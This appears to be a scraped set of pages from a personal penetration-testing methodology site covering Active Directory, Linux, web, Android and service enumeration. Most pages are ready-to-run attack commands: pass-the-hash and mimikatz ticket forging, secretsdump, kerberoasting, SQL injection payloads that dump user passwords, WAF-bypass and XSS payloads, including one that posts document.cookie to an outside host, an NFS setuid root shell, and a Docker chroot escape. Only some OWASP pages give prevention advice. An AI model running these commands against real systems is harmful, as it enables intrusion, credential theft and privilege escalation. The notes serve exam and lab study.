    "body": "POP3 (110) nc -nvC 10.11.1.72 110\n\nUSER root\n\nPASS password",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/POP3 (110) 3a50f261a9c64e2b8184ff4f2491aa37.html"
  },
  {
    "title": "AD Post Compromise Exploitation",
    "body": "AD Post Compromise Exploitation Pass the Hash / Password: crackmapexec we can hashdump  and pass the hash across the network Pass the password: crackmapexec smb 0.0.0.0/24 -u user -d DOMAIN.local -p password\ncrackmapexec smb 0.0.0.0/24 -u user -d DOMAIN.local -p password --sam\ncrackmapexec smb 0.0.0.0/24 -u user -d DOMAIN.local -p password --local-auth\n#We can also use...\nimpacket-wmiexec domain/user:'password'@0.0.0.0\nimpacket-smbexec domain/user:'password'@0.0.0.0 secretsdump.py  - impacket  dumps NTDS.dit and kerberos keys impacket-secretsdump Administrator:'password'@IP\nimpacket-secretsdump domain/user:password@IP Cracking NTLM Hashes NTLM can be passed but NOT NTLMv2 hashcat -m 1000 hashes.txt rockyou.txt Pass the hash: crackmapexec smb 0.0.0.0./24 -u user -H <hash> --local-auth\nimpacket-psexec \"user\":@0.0.0.0 -hashes <NTLM.Hash>\n#PTH using pth-winexe\npth-winexe -U user%<hash> //0.0.0.0 cmd Overpass the hash Gain a full kerberos TGT which grants access to another machine or service as that user mimikatz:\nsekurlsa::logonpasswords\nsekurlsa::pth /user:user /domain:domain.com /ntlm:<users-hash> /run:Powershell.exe\n#On machine\nklist\nnet use \\\\dc01 Pass the Ticket Can be user other places on the network whoami /user #grab sid\nkerberos::purge\nkerberos::list\n#Create a silver ticket using mimikatz\nkerberos::golden /User:Administrator /domain:domain.local _sid:<sid> /target:<targetserver.com> /service:HTTP /rc4:<Services PW hash> /ptt\n======\nprivilege::debug\nsekurlsa::tickets /export\n#in the output, look for a Administrator ticket from the krbtgt \nkerberos::ptt ticket_name.kirbi\n Pass attack mitigation: Limit account resuse Utilize strong password Privilege access management (PAM) Token impersonation: Tokens are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers. Two types: Delegate - created for logging into a machine or using Remote Desktop Impersonate - \u201cnon interactive\u201d such as attaching a network drive or a domain logon script. Incognitio token impersonation: (inside meterpreter sesssion)\nload incognito\nlist tokens -u\nimpersonate_token marvel\\\\administrator\nwhoami\nhashdump \n After impersonation we can dump all the hashes on the network \n Token impersonation mitigation: Limit user/group token creation permissions Account tiering local admin restriction \n AS_REP roasting: harvest the non-preauth AS_REP responses for a given list of usernames: impacket-GetNPUsers -format john -dc-ip <ip> -usersfile <.lst> <domain>/ Kerberoasting: Retrieve and crack service account hashes impacket-GetUserSPNs -dc-ip <ip> 'hostname/user' -request\nimpacket-GetUserSPNs -dc-ip <ip> hostname/user:password -request Crack kerberoasted hashes: hashcat -m 13100 hashes.txt rockyou.txt -o hashcat Rubeus kerberroast on machine: Rubeus.exe kerberoast /format:hashcat > Hash1 Rubeus as_rep roast on machine: Rubeus.exe asreproast /format:hashcat > Hash1\n#insert $23$ after krbtgs\nhashcat -m 18200 -a 0 hashes.txt rockyou,txt -o hashcat Kerberoast Manual: mimikatz: kerberos::list /export\n#move hash over to kali, then \nsudo apt install kerberoast\npython /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <hashfile>.kirbi Kerberoasting Mitigation: Strong Passwords Least privilege \n GPP (group policy preferences) /  cPassword Attacks: GPP allows admins  to create policies using embedded credentials these credentials were encrypted and placed in a \u201ccPassword\u201d The key was accidentally released. Patched in MS14-025, but doesn\u2019t prevent previous uses. \n smb_enum gpp metasploit module to check if vulnerable Look for groups.xml file for GPP \n use gpp-decrypt on hash to get password, user in the groups.xml",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/AD Post Compromise Exploitation db5abca2a3934732b58c483ae36a32b1.html"
  },
  {
    "title": "WSL",
    "body": "WSL PayloadsAllTheThings EoP WSL:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md#eop---windows-subsystem-for-linux-wsl Box: smbclient -L \\\\\\\\<ip>\\\\ psexec.py  <user>:\u2019<pwd>\u2019@<ip> sc query windefend # windows defender status where /r c:\\windows bash.exe where /r c:\\windows wsl.exe python -c \u201cimport pty:pty.spawn(\u2019/bin/bash\u2019)\u201d if psexec fails try smbexec or wmi?",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/WSL 29e19c9894c1485f9c3e47325e3d223c.html"
  },
  {
    "title": "Android Dynamic Analysis",
    "body": "Android Dynamic Analysis \n SSL Pinning: methodology to prevent application traffic from being intercepted (similar to MiTM attack) some apps VERIFY that the recieved traffic is coming from a known certificate. \n \n A Tale of Two Proxies Burpsuite Proxy tool with a lot of built-in penetration testing tools Can be used for iOS and Android\nWill be our last resort in iOS with a jailbroken device (Burp Mobile Assistant) Proxyman Newer tool that works only on MacOS, but it has the ability to easily import it's certificate into the Mac Keychain and intercept application traffic Can be used for iOS and Android Other options mitmproxy, charles proxy, fiddler, etc. \n Android Interception Process: Start Proxy Software (Burp Suite or Proxyman) Configure Proxy Software Set Proxy of the Emulator (or wifi settings for a physical device) Intercept HTTP traffic Import CA Certificate Trust CA Certificate in Android Certificate Store Intercept HTTPS Traffic = Profit?! (or be shamed by SSL Pinning) If shamed by SSL Pinning, try Objection /Frida! \n Burp Set up: Proxy \u2192 options \u2192 Import/export CA Certificate \u2192 Export certificate in DER format \u2192 BURP.cer drop this cert into your android phone Security \u2192Credential store \u2192 trusted \u2192 import \u2192Select the certificate \u2192 set up a pin We can try and bypass SSL pinning! the app may crash if SSL pinning is still active Frida/Objection: \n Patching automatically via objection: \n First try to patch an app with objection If that doesnt work try patching Frida manually pip3 install frida-tools\npip3 install objection objection patchapk --source app.apk \n Manual Frida injection: Decompile the app apktool d -r app.apk cd to folder with correct system architecture Get the frida gadget for that architecture Check frida github releases https://github.com/frida/frida/releases/ wget  unzip with unxz frida gadget rename file to \u2018libfrida-gadget.so\u2019 paste into /lib/{architecture} /small/b3nac/appname/activity to be loaded at start of app (MainActivity?) paste frida code in smali file under .method public constructor <init>, above the return void; apktool b app.apk app_patched.apk",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Android Dynamic Analysis 345aba638f6144b18fa69dd83b191e47.html"
  },
  {
    "title": "Android Static Analysis",
    "body": "Android Static Analysis Android is based on linux Therefore, it uses linux filesystem \n /data/app/com.example.app - generic app data /data/data/com.example.app - runtime data storage /mnt/sdcard/Android/data/com.example.app - external stored location for runtime /data/data/com.example2.app - different app requiring a different user  \n Pulling an APK: ex: injuredandroid \n in android studio:  adb shell (gets shell for phone)\npm list packages | grep \u201cinjured\u201d\npm path <package name>\nexit\nadb pull <path to package> package-pulled.apk \n Android Manifest.xml: every app has it applications foundations are defined minSDKVersion permissions hardcoded strings Activities Content Providers permissions: What the app needs access to\u2026 camera, bluetooth, internet, contacts, etc Activities: UI elements or different screens in the app intent filters allow us to protect unauthorized access to activities an Exported=\u201dTrue\u201d intent can be viewed outside the app Content providers used to serve data from your app to another app \n Static analysis decompiling: apktool d file.apk r JADX gui \n common application strings: can be found in activity source code or in resources/strings.xml look for: login bypass, exposed urls, api keys, firebase urls \n starting an activity: adb shell\nam start <activity/.activity> \n \n AWS profiles and creds enumeration: cloudenum python3 cloudenum.py -k name awscli aws configure --profile profilename\naws s3 ls s3://bucket --profile profilename \n \n firebase enumerations: firebaseenum python3 firebaseenum.py -k name\n\n\n===\n\nfirebaseui.com/found_folder/.json \n \n MobSF",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Android Static Analysis d1f7e2c97e0f479a98699e546a74e8c6.html"
  },
  {
    "title": "RunAs",
    "body": "RunAs \n #find users with stored credentials\ncmdkey /list\n#run commands as the user with stored creds\nC:\\Windows\\System32\\runas.exe /user:ACCESS\\Administrator /savecred \"C:\\Windows\\System32\\cmd.exe /c TYPE C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\security\\root.txt",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/RunAs f8cf53c98b6f47d38c4d07559785b1e2.html"
  },
  {
    "title": "7. Identification and Authentication Failures",
    "body": "7. Identification and Authentication Failures https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/ \n Authentication identifies users and confirms that they are who they say they are\u2026 Insecure authentication implementation that causes issues. \n Finding and exploiting authentication vulnerabilities\u2026 Weak password requirements Register weak password accounts Look for password policy in documentation Missing or insecure MFA Improper restriction of authentication attempts Look for lockout mechanisms on failed login attemps See if lockout mechanism is susceptible to bypasses Verbose error messages Review changes in requests to identify correct or incorrect information Vulnerable transmission of credentials Insecure forgot password functionality Cookies that aren\u2019t tied to verification codes Insecure storage of credentials \n Prevention: Wherever possible, utilized MFA Change all default credentials Always use an encrypted channel Only POST requests should be used to to transmit credentials to the server Stored credentials should be hashed and salted using secure cryptography Implement NIST 800-63b effective password policy Use identical or generic errors on failed login attempts Use a simple password checker to motivate stronger passwords Implement robust brute force protection Audit authentication validation and verification logic for errors \n Examples: Username enumeration via different responses: We can enumerate valid usernames in Burp suite by identifying responses with different  lengths. We can do the same with a valid username and passwords \n 2FA Bypass: Assumes you have valid password Test what happens if we drop the 2FA request in burp Does it enforce the endpoint? Does it let us in anyways? Is the 24A code brute forcible? \n Password reset broken logic: Look for temporary forgot password tokens Can we change this to any value and change the user whose password is getting reset? Look for this int he post requests.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/7 Identification and Authentication Failures bad6531dc6bd4d968b7dcb0c8432b5f2.html"
  },
  {
    "title": "1. Broken Access Control",
    "body": "1. Broken Access Control \n Resources: https://owasp.org/Top10/A01_2021-Broken_Access_Control/ A uthentication  - A way to verify users are who they say they are Session management  - identifies which subsequent HTTP requests are being made by the user Access Control  - determine if the user is allowed to carry out the action they are attempting to perform. Vertical, horizontal, and context dependent (make sure things happen in the right order) access control rules exist in secure applications. BAC occurs when users are able to act outside of their intended permissions. vBAC allows for horizontal, vertical, and context dependent privilege escalation \n Examples: Unprotected admin functionality: Fuzz the admin panel and having access as a normal user Use common admin endpoints for frameworks etc. \n Unprotected admin functionality with unpredictable URL: Admin endpoint can be disclosed in requests, HTML, Javascript, CSS files Fuzzing can  \n User role controlled by request parameter: We can set Admin=true in admin cookies or other parameters that contain the admin keyword \n User role can be modified in user profile: We can change role parameters in requests that may be present in different user profile functionalities such as changing emails, passwords, profile settings, etc \n URL-based access control can be circumvented: X-Original-URL Header: X-Original-URL: doesnotexist.com Look for a not found response Then change the URL to restricted admin endpoint \n Method-based access control can be circumvented: We can change request methods from POST \u2192 GET, etc to gain admin functionality \n User ID controlled by request parameter: Changing id parameters to another valid user and see if any sensitive info is released in response \n User ID controlled by request parameter, with unpredictable user IDs: We can see userids from different profiles or blog posts and use this user id to login or change settings of the other user. \n User ID controlled by request parameter with data leakage in redirect: Check login page redirect requests for any sensitive data leakage \n User ID controlled by request parameter with password disclosure: User passwords may be saved or hardcoded on pages where the user has access with their parameter in the request \n Insecure direct object references: Directly access different files you are not supposed to see by fuzzing the predictable parameters in the request \n Multi-step process with no access control on one step: A confirmation request does not implement AC even though the first request did we can send the confirmation request from any user without authorization For example we can upgrade a user in the app by sending the request and never actually utilizing the admin dashboard. \n Referer-based access control: We can change the referer header to bypass access control rules. Some applications use the referer header to confirm where a user came before allowing access.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/1 Broken Access Control 5b6809e8a9464e03ad8f20c8dc3bcff5.html"
  },
  {
    "title": "Web (80,443,8080)",
    "body": "Web (80,443,8080) dirbuster\n\nrobots.txt, .htaccess, .htpasswd\n\ncode injects sqlinjections\n\nadmin\u2019 OR 1=1 \u2014\n\nSSTI {{4*4}}\n\n&&<code to inject>\n\nfile upload?\n\nwebshell?\n\nlog poisoning?\n\nXSS?\n\nIDOR?\n\nClient side attacks?\n \n Enumerating HTTP/HTTPS: go to the website note default webpage information (if possible) robots.txt file busting See what services running look for information disclosures (versions, directories, hostnames) Nikto - web vulnerability scanner (may be blocked by WAF) nikto -h <host website> dirbuster dirbuster& (summons gui) Also look through source code (passwords, keys, etc) Burpsuite sending to repeater to modify in real time ffuf -w wordlist.txt -u <url-FUZZ> -o output.txt -replay-proxy <proxy-url> -b <cookie> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u http://10.11.1.71/site/index.php/ -t 30 -x php,txt -k wfuzz -c -z file,/path/to/wordlist.txt \u2014hc 404 \u201c$URL\u201d",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Web (80,443,8080) a1034d45a0184c99916f0a557d07a972.html"
  },
  {
    "title": "NFS Root Squashing",
    "body": "NFS Root Squashing Check for vulnerability cat /etc/exports you'll see no_root_squash \n mkdir /tmp/mountme\nmount -o rw,verse=2 <ip>:/tmp /tmp/mountme\necho 'int main() { setgid(0); setuid(0); system(\"/bin/bash\"); return 0;}' > tmp/mountme/x.c\ngcc <file> -o <file>\n\n# run the file\n# NFS misconfig where all NFS is run as root \n Example: \nvictim machine:\ncat /etc/exports\n/srv/Share 0.0.0.0/24(insecure,rw)\n/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)\n\nssh -L 2049:127.0.0.1:2049 user@IP\n\nmount -t nfs -o port=2049 127.0.0.1:/srv/Share /mnt/share\n\ncp shell in /mnt/share\n\nchmod +s shell\n\non victim machine:\n./shell",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/NFS Root Squashing 9892708f70f440389ea2aad93b9ebcd2.html"
  },
  {
    "title": "Kernel Exploits",
    "body": "Kernel Exploits Metasploit: After MS exploit suggestion msfconsole\nuse <exploit>\noptions\nset <options>\nexploit \n Manual Exploit: Check exploitdb, github, google secwiki kernel exploit github https://github.com/SecWiki/windows-kernel-exploits https://github.com/egre55/windows-kernel-exploits python -m SimpleHTTPServer 80\npython3 -m http.server\n\ncd into temp folder\ncertutil -urlcache -f http://<IP>/<file(s)>>\n make sure you have RDP access for some kernel exploits, otherwise try another that doesnt require popping up another window.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Kernel Exploits 6fb390af18284199aa7610257988c778.html"
  },
  {
    "title": "Linux",
    "body": "Linux \n TO BOX: Python: #Check both python, python2, and python3!\n#Python 2\npython -m SimpleHTTPServer 80\n#python 3\npython -m http.server 8000 \n wget wget http://ip:port/file \n scp scp file user@0.0.0.0:/file/location curl \n Metasploit upload/download feature \n \n FROM BOX: scp scp user@0.0.0.0:/file .",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Linux 0a44a1c3a2bb435e9f6ff2fbf329919f.html"
  },
  {
    "title": "Stored Passwords, File Permissions, SSH Keys",
    "body": "Stored Passwords, File Permissions, SSH Keys Coloring output: grep --color=auto -rnw '/' -ie \"PASSWORD\" --color=always 2> /dev/null\nfind . -type f -exec grep -i -I \"PASSWORD\" {} /dev/null \\; Stored passwords Passwords in history: history\ncat .bash-history Payloads all the things has good commands for colorcoding passwords in directories... Passwords could be stored in files history | grep pass Weak File Permissions: Sensitive files: #if we can edit we can remove/modify passwds change groups etc.\n\nls -al /etc/passwd\n\nls -al /etc/shadow\n\n#unshadow the stored password files\nunshadow passwd shadow\njohn unshadow --wordlist=rockyou.txt --format=crypt\n#Run in hashcat SSH Keys find / -name authorized_keys 2> /dev/null\nfind / -name id_rsa 2> /dev/null\n\n# Use found keys to try log into users\nchmod 600 id_rsa\nssh -i id_rsa user@0.0.0.0",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Stored Passwords, File Permissions, SSH Keys 16d7bedb94564f08a6648d0e67e66793.html"
  },
  {
    "title": "Docker",
    "body": "Docker Docker: deepce = linpeas for dock containers https://github.com/stealthcopter/deepce \n GTFObins Docker:  https://gtfobins.github.io/gtfobins/docker/ docker run -v /:/mnt --rm -it bash chroot /mnt sh",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Docker 9e591ea9d7e74c14a4f72d0e76530a64.html"
  },
  {
    "title": "4. Insecure Design",
    "body": "4. Insecure Design https://owasp.org/Top10/A04_2021-Insecure_Design/ \n How to Prevent Establish and use a secure development lifecycle with AppSec professionals to help evaluate and design security and privacy-related controls Establish and use a library of secure design patterns or paved road ready to use components Use threat modeling for critical authentication, access control, business logic, and key flows Integrate security language and controls into user stories Integrate plausibility checks at each tier of your application (from frontend to backend) Write unit and integration tests to validate that all critical flows are resistant to the threat model. Compile use-cases  and  misuse-cases for each tier of your application. Segregate tier layers on the system and network layers depending on the exposure and protection needs Segregate tenants robustly by design throughout all tiers Limit resource consumption by user or service",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/4 Insecure Design ecee1a5b6c4d4e27bbbcbe9ab771597d.html"
  },
  {
    "title": "LDAP (389)",
    "body": "LDAP (389) \n https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap cn=admin,dc=example,dc=com #new syntax\nldapsearch -x -H ldap://0.0.0.0 -b \"dc=name1,dc=name2\"\n#Old syntax\nldapsearch -h <target_system> -p <ldap_port> -b \"<base_dn>\" \"(&(objectclass=*)(userPassword=*))\"\nldapsearch -h <target_system> -p <ldap_port> -b \"<base_dn>\" -D \"<dn>\" -w \"<password>\" \"(&(objectclass=*)(userPassword=*))\"\nldapsearch -h <target_system> -p <ldap_port> -b \"<base_dn>\"\n#Uses anonymous credentials\n#nmap ldap enumeration\nnmap -n -sV --script \"ldap* and not brute\" 0.0.0.0 \n#ldapdomaindump\nldapdomaindump -h <target_system> -p <ldap_port> -D \"<bind_dn>\" -w \"<bind_password>\" -b \"<base_dn>\"",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/LDAP (389) 3d98fbb5fa78495a8ea2a6ed8bf6ed40.html"
  },
  {
    "title": "WAF",
    "body": "WAF \n Web application firewalls are comprised of an inspector and a checker. Inspector inspects and classifies traffic the checker will enforce rules, whitelists, blacklists Bypass techniques: IP Spoofing: BurpSuite \u2192 User Options \u2192 Socks _Proxy \u2192 use Socks proxy + add info X-Forwarded-For: 0.0.0.0 \n Generic checklist: Base64 encoding our payload /?q=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=_ ASPX removes % not followed by two hex characters https://site.com/index.php?%file=cat /etc/paswd We can use spaces to fool a WAF  <Img src = x onerror = \"javascript:window.onerror = alert; throw XSS\"> Backslashes in filtered words https://site.com/index.php?file=cat/etc/pa\\swd \n Quotes and *  https://site.com/index.php?file=cat /etc/pa*swd\n\nhttps://site.com/index.php?file=cat /etc/pa**swd\n\nhttps://site.com/index.php?file=cat /etc/pa's'wd\n\nhttps://site.com/index.php?file=cat /etc/pa\"s\"wd \n Wildcards  https://site.com/index.php?file=cat /e??/p???? Replace spaces with /  <svg/onload> Custom tags  https://acd91f8b1e2bae3781d35fe600c30081.web-security-academy.net/?search=<CUSTOM+id%3Dx+onfocus%3Dalert(document.cookie) tabindex=1>#x \n Using different language chars e.g. \u0113 instead of e \n Airlock Ergon %C0%80'+union+select+col1,col2,col3+from+table+--+ \n Every space here is replaced by a + and we have the %C0 and %80 url encoded values at the beginning of our attack vector \n Barracuda <body style=\"height:1000px\" onwheel=\"alert(1)\">\n\n<div contextmenu=\"xss\">Right-Click Here<menu id=\"xss\" onshow=\"alert(1)\">\n\n<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)> A smart bypass making use of several tricks. The first line will use the onwheel event handler which is not filtered in Barracuda. We also have a very smart use of the url encoded characters on the third line. GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only\n\n=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/\n\nbad-example.exe%3E&&backup_type=ftp&&backup_life=5&&backup_server=%3E%22%3Ciframe%20src%3D\n\nhttp%3A//www.example.net/etc/bad-example.exe%3E&&backup_path=%3E%22%3Ciframe%20src%3Dhttp%\n\n3A//www.example.net/etc/bad-example.exe%3E&&backup_password=%3E%22%3Ciframe%20src%3Dhttp%3\n\nA//www.example.net%20width%3D800%20height%3D800%3E&&user=guest&&password=121c34d4e85dfe675\n\n8f31ce2d7b763e7&&et=1261217792&&locale=en_US\n\nHost: favoritewaf.com\n\nUser-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT) Several smart tricks to achieve HTMLi: \n <a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere url encoded value %0A which is placed between every character of javascript. %0A translates to a linefeed. \n https://github.com/0xInfection/Awesome-WAF#known-bypasses",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/WAF 1e04bb0b035747f2a816aee1c6fdeac5.html"
  },
  {
    "title": "Cross-Site Scripting (XSS)",
    "body": "Cross-Site Scripting (XSS) https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html Reflected \u2192 server reads and responds. It reflects back on the page. Alert script example, Stealing Cookies Stored \u2192 inject a payload and we can leave and come back it will still be there Comment section, blog posts DOM \u2192 exploiting DOM client side Reflected and DOM require social engineering Inspecting anything with input or parameters XSS Payloads and try them through BURP intruder. Preventing XSS: Encoding < becomes &lt; <script> becomes &lt;script> Filtering <script> become script Validating Comparing input against whitelist Sanitization Combination of escaping, filtering, validation \n \n Bypassing HTML Encoding: javascript:alert(1) \n Mouse Over Payload: \" onmouseover=\"alert(1)\" \n Stealing Cookies: <scripts> \nfetch('http://url.com',{method: 'POST', mode: 'no-cors', body:document.cookie});\n</script> Use burp collaborator client",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Cross-Site Scripting (XSS) d4a77b8ee43841589d95eebc42256659.html"
  },
  {
    "title": "SQL Injection",
    "body": "SQL Injection https://portswigger.net/web-security/sql-injection/cheat-sheet MSSQL Guides https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MSSQL Injection.md https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/ MySQL Guides https://github.com/payloadbox/sql-injection-payload-list \n Payloads: possible statements being used\nSELEC \n SQLi UNION attack determining the number of columns: ' UNION SELECT NULL--\n' UNION SELECT NULL, NULL--\n' UNION SELECT NULL, NULL, NULL--\n\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3-- SQL injection UNION attack, finding a column containing text: ' UNION SELECT NULL, 'a', NULL--\n \n SQL injection UNION attack, retrieving data from other tables: ' UNION SELECT username, password, from users--\n \n Retrieving multiple values in a single column with Union Attacks: ' UNION SELECT NULL, username || password from users-- \n Listing content on non-oracle databases: #1. Determine the number of columns\n' order by 1--\n#2. Find columns that accept strings\n' UNION select 'a', 'a'--\n#3. Determine database we are working with\n##MSSQL\n' UNION SELECT @@version, NULL--\n##PostGreSQL\n' UNION SELECT version(), NULL--\n##MySQL\n' UNION SELECT @@version, NULL--\n#4. Output list of tables in the database \n##PostgresSQL\n' UNION SELECT table_name, NULL FROM information_schema.tables--\n#5. Output columns names from table\n##PostgresSQL\n' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'TABLE_NAME_HERE'--\n#6. Output list of users and passwords\n##PostgresSQL\n' UNION SELECT usernames, passwords FROM users_table-- \n Listing Contents   Oracle Databases: #1. Determine the number of columns\n' order by 1--\n#2. Find columns that accept strings\n' UNION select 'a', 'a' from DUAL--\n#3. Determine database we are working with\n' UNION SELECT banner, NULL FROM v$version-- \n#4. Output list of tables in the database \n' UNION SELECT table_name, NULL FROM all_tables--\n#5. Output columns names frmo table\n' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'TABLE_NAME_HERE'--\n#6. Output list of users and passwords\n' UNION SELECT users, passwords FROM users_table_name-- DATABASE COMMANDS: MSSQL: sqsh -S server_name -U username -P password\n\nproxychains4 impacket-mssqlclient sa:pass@0.0.0.0\n\nSELECT name FROM sys.databases;\n\nuse database;\n\nSELECT name FROM sys.tables;\n\nSELECT * FROM Customer; \n \n \n SQLMAP: sqlmap -r /home/parallels/Desktop/request.txt --dbs\nsqlmap -r /home/parallels/Desktop/request.txt -D information_schema --tables\nsqlmap -r /home/parallels/Desktop/request.txt -D blog --tables\nsqlmap -r /home/parallels/Desktop/request.txt -D blog -T users --dump\nsqlmap -r /home/parallels/Desktop/request.txt -D blog -T config --dump \n BLIND SQL INJECTIONS: Blind SQL Injection with conditional responses: #TODO \n Blind SQL Injection with conditional errors: #TODO Blind SQL Injection with time delays: #TODO Blind SQL Injection Out of band: #TODO \n SQL Injection",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SQL Injection 5779668248fc41f9a174e20862211526.html"
  },
  {
    "title": "Attacking Authentication",
    "body": "Attacking Authentication \n Who you are and proving your identify \n Bearer tokens: JWT, Oauth2, API Keys Often attacked in 2 ways: Target is unprotected against brute force attacks (no rate limiting) Logic issues with the application (injection) \n \n Attacking Tokens: Hashcat JWT signature bruteforce: hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt \n \n jwt_tool: https://github.com/ticarpi/jwt_tool \n jwt_tool <JWT> -T \n jwt_tool -t http://0.0.0.0/end/point -rh 'Authorization: Bearer <JWT>' -M at \n jwt_tool -C -d /rockyou.txt '<JWT>' Burp suite extender: JWT editor",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/Attacking Authentication 62459afb83a342abbe58f8c728a28a53.html"
  },
  {
    "title": "6.  Vulnerable & Outdated Components",
    "body": "6.  Vulnerable & Outdated Components https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/ \n Prevention: Update or remove vulnerable components",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/6 Vulnerable & Outdated Components 7ef68c315a104eb08afea5ca4a482fc3.html"
  },
  {
    "title": "SSH (22)",
    "body": "SSH (22) Using discovered Private Keys to gain SSH access: #if password is required we can get it from the hash\nssh2john id_rsa_file hash.txt\njohn hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\n\n#Start here if not required\n#paste private key into id_rsa\nchmod 400 id_rsa #600?\nssh user@ip -i id_rsa",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SSH (22) bfa1fad11e2b447f96efb3613467c3a0.html"
  },
  {
    "title": "FTP (21)",
    "body": "FTP (21) ftp <IP>\nftp <IP> -A\n---\nbinary - binary encoding\nactive - active mode\nget <file>\nput <file>\nmget *?\n\n---\nanonymous login: username: anonymous password <blank>\n\nIs the FTP share reflected to a webserver? \n Download all FTP files without seeing them with wget: wget -m ftp://user:password@IP\n\nwget -m --user=username --password=password ftp://ip.of.old.host Is the version of ftp vulnerable?",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/FTP (21) 8c002b334a7f442890a191f2bd0f2b45.html"
  },
  {
    "title": "SNMP (161/162)",
    "body": "SNMP (161/162) MIB tree: 1.3.6.1.2.1.25.1.6.0 System Processes 1.3.6.1.2.1.25.4.2.1.2 Running Programs 1.3.6.1.2.1.25.4.2.1.4 Processes Path 1.3.6.1.2.1.25.2.3.1.4 Storage Units 1.3.6.1.2.1.25.6.3.1.2 Software Name 1.3.6.1.4.1.77.1.2.25 User Accounts 1.3.6.1.2.1.6.13.1.3 TCP Local Ports snmpwalk and snmpenum \n snmpwalk -c public -v1 -t 10 0.0.0.0\n#enumerates windows users\nsnmpwalk -c public -v1 0.0.0.0 1.3.6.1.4.1.77.1.2.25\n#enumerate running processes\nsnmpwalk -c public -v1 0.0.0.0 1.3.6.1.2.1.25.4.2.1.2\n#enumerate open TCP ports\nsnmpwalk -c public -v1 0.0.0.0 1.3.6.1.2.1.6.13.1.3 \n sudo nmap -sU --open -p 161 0.0.0.0-254 -oG open-snmp.txt\nsudo nmap -sU -p161 --script *snmp* $target \n kali@kali:~$ echo public > community\nkali@kali:~$ echo private >> community\nkali@kali:~$ echo manager >> community\n\nkali@kali:~$ for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips\n\nkali@kali:~$ onesixtyone -c community -i ips\nScanning 254 hosts, 3 communities\n10.11.1.14 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)\n10.11.1.13 [public] Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPATIBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)\n10.11.1.22 [public] Linux barry 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686\n... Once we find SNMP services, we can start querying them for specific MIB data that might be interesting.",
    "url": "https://tyohare.github.io/assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449/SNMP (161 162) 4a87cde5f8144303bb64d545d5d86571.html"
  },
  {
    "title": "Cross-Site Request Forgery (CSRF)",
    "body": "Cross-Site Request Forgery (CSRF) \n For CSRF to be possible we need: A relevant action Cookie-based session handling No unpredictable request parameters \n \n The attacker forces the victim to perform an action unintentionally while the victim is authenticated.",
